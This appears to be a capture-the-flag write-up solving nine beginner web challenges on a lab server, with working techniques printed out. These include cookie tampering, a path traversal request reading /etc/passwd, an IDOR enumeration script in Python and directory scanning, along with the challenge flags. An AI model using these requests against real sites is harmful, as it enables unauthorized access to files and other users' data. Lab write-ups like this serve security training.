# Beep Beep Boop
Using dirsearch shows robots.txt which disallows an interesting page
```txt
User-agent: *
Disallow: /73656372657420666f72204153494d4f.php
```

When accessing that page we see
```txt
This is a secure area that can only be accessed by the most advanced humanoid robots.
```

We see we have a cookie named "robotType" with has the value "HUMAN", changing it to "ASIMOV" shows the flag
```txt
SSS{We_w0rsh1p_1saac_As1m0v}
```

# Do you need Glasses
A password in base64 can be found in the source code of the page 
```html
  <meta content="anVreG9xbm5jYQ==" name="password">
```

Which decrypts to "jukxoqnnca"

After using dirsearch we find (it was also hidden in the page source) 
```bash
http://141.85.224.101:30017/staff.html
```

Found a comment which mentions a secret field
```html
<!--<input type="checkbox" name="secret" class="form-control" id="checkbox" value="42">-->
```

We make a request with burp and are redirected to the admin page
```http
username=admin&password=jukxoqnnca&secret=42
```

```html
<!--<p>FFF{1_er4yyl_y1xr_y34i1at_ge4p3f_1a_p0zz3agf}</p>-->
```

It's encrypted with ROT13, using cyber chef it results into
```txt
SSS{1_re4lly_l1ke_l34v1ng_tr4c3s_1n_c0mm3nts}
```

# Great names
We see a cookie named 'marco', after changing it's value to polo and refreshing we see a new cookie appear named "fernando", we continue this chain until we get the flag

The last response mentions looking in the document body
```bash
curl -i -b "PHPSESSID=a367f1bbd7a8; marco=polo; fernando=magellan; cristofor=columb" http://141.85.224.101:30018/
HTTP/1.1 200 OK
Date: Thu, 25 Jun 2026 16:36:47 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.34
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: marco=%3F; expires=Fri, 26-Jun-2026 16:36:47 GMT; Max-Age=86400
Set-Cookie: fernando=%3F
Set-Cookie: cristofor=%3F
Set-Cookie: GG=Now+look+closer+in+the+document+body
Content-Length: 44
Content-Type: text/html; charset=UTF-8

<!--SSS{y0u_f0und_th3_gr3at3st_3xpl0r3rs}-->%
```

```txt 
SSS{y0u_f0und_th3_gr3at3st_3xpl0r3rs}
```

# Traverse Universe
We see it loads planets with ?planet=example.php. We test for path traversal and see that it's successful

```http
http://141.85.224.101:30022/planetarium/index.php?planet=../../../../../../../../../../../etc/passwd
```

```txt
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Inspecting the page source shows a script which has the path to the flag

```javascript
var _0x5c09=['dot-php','earth\x20','log','slash\x20','dot-dot-slash\x20','flag\x20','NASA\x20'];(function(_0xe916b7,_0x5c0933){var _0x34f1b0=function(_0x4a989c){while(--_0x4a989c){_0xe916b7['push'](_0xe916b7['shift']());}};_0x34f1b0(++_0x5c0933);}(_0x5c09,0xa1));var _0x34f1=function(_0xe916b7,_0x5c0933){_0xe916b7=_0xe916b7-0x0;var _0x34f1b0=_0x5c09[_0xe916b7];return _0x34f1b0;};var algf=_0x34f1('0x4')+_0x34f1('0x1')+_0x34f1('0x3')+'moon\x20'+'slash\x20'+_0x34f1('0x6')+_0x34f1('0x3')+_0x34f1('0x5')+_0x34f1('0x0');console[_0x34f1('0x2')](algf);
```

We run it and we get it

```txt
dot-dot-slash earth slash moon slash NASA slash flag dot php
```

```http
?planet=../earth/moon/NASA/flag.php
```

```txt
SSS{t0_the_m00n_and_back}
```

# Nobody loves me
Inspecting the page source reveals a script and a url, /ernq-svyr.php

```html
<script>
function ernqsvyr() {
    $.ajax({
        url: './ernq-svyr.php',
        dataType: "text",
        success: function(data){
            console.log(data);
        }
    });
}
</script>
```

Entering on that page shows the flag

```txt
SSS{did_y0u_just_c4ll_m3_h3r3_qu3sti0n_m4rk}
```

# Santa
We Inspect the source and see the file main.js, the flag is in there

```javascript
!(function ($) {
  "use strict";

  // Set the count down timer
  if ($(".countdown").length) {
    var count = $(".countdown").data("count");
    var template = $(".countdown").html();
    $(".countdown").countdown(count, function (event) {
      $(this).html(event.strftime(template));
    });
  }

  // Back to top button
  $(window).scroll(function () {
    if ($(this).scrollTop() > 100) {
      $(".back-to-top").fadeIn("slow");
    } else {
      $(".back-to-top").fadeOut("slow");
    }
  });

  $(".back-to-top").click(function () {
    $("html, body").animate(
      {
        scrollTop: 0,
      },
      1500,
      "easeInOutExpo"
    );
    return false;
  });

  $(".countdown").ready(function () {
    return atob("SSS{chr1stm4s_c4m3_e4rly_h3_he_h3}");
  });
})(jQuery);

```


```txt
SSS{chr1stm4s_c4m3_e4rly_h3_he_h3}
```

# Mind your own business
We purchase something and get redirected to the invoice

```http
http://141.85.224.101:30019/invoice.php?invoice=7
```

This endpoint is vulnerable to IDOR, we can view invoice=1,2,3 even though they are not ours

We test some ids and see that the ones that work are 1,2,3,5,8,13, which are part of the fibonacci sequence

We then write a python script to test fibonacci numbers until one is successful
```python
import requests
import re

URL = "http://141.85.224.101:30019/invoice.php?invoice="

fibo1 = 1
fibo2 = 1

while True:
    fibo3 = fibo1 + fibo2 
    fibo1 = fibo2
    fibo2 = fibo3

    print(f"Testing for {fibo3}")
    new_url = URL + str(fibo3)
    
    r = requests.get(url = new_url)
    
    match = re.search(r'SSS\{.*?\}', r.text)

    if match:
        flag = match.group(0)
        print(flag)
        break
```

```txt
SSS{1ts_n0t_nic3_t0_sn00p_ar0und}
```


# Colors
It only has a button to go to the next page
```http
http://141.85.224.101:30016/index.php?index=1
```

Going to index 10000000000, shows the message "WTF MAN? 404", we just have to check every index in order until we find the correct one, or do some sort of binary search

The index was 3141

```txt
SSS{d1d_y0u_4ctu4lly_cl1ck_3141_t1mes}
```

# Chef hacky mchack
We see a cookie named "u" with the value "guest"

Using dirsearch we find ./manage.php
```bash
python3 dirsearch.py -u http://141.85.224.101:30015/

[20:08:36] Scanning: 
[20:08:45] 301 -   326B - /assets  ->  http://141.85.224.101:30015/assets/
[20:08:45] 403 -   282B - /assets/
[20:08:51] 200 -   16KB - /index.php
[20:08:51] 200 -   16KB - /index.php/login/
[20:08:52] 200 -     0B - /manage.php
[20:08:56] 403 -   282B - /server-status
[20:08:56] 403 -   282B - /server-status/
```

Accessing manage.php with the cookie set to "hacky mchack" reveals the flag

```txt
SSS{n0_m0r3_c00ki3s_f0r_y0u_m1st3r}
```

